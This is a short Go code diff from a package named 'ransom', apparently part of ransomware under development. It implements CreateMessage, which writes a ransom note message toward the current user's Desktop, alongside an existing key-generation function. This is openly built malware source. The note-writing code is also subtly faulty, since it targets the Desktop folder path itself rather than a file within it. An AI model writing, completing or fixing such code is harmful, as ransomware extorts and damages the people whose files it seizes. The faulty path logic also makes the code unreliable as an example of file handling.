@@ -2,6 +2,9 @@ package ransom
 
 import (
 	"crypto/rand"
+	"os"
+	"os/user"
+	"path"
 	"strings"
 )
 
@@ -72,7 +75,10 @@ func GenerateKey() string {
 	return builder.String()
 }
 
-//TODO: add an encryption message
 func CreateMessage() {
-
+	usr, err := user.Current()
+	if err != nil {
+		panic(err)
+	}
+	err = os.WriteFile(path.Join(usr.HomeDir, "Desktop"), []byte(Message), 0664)
 }
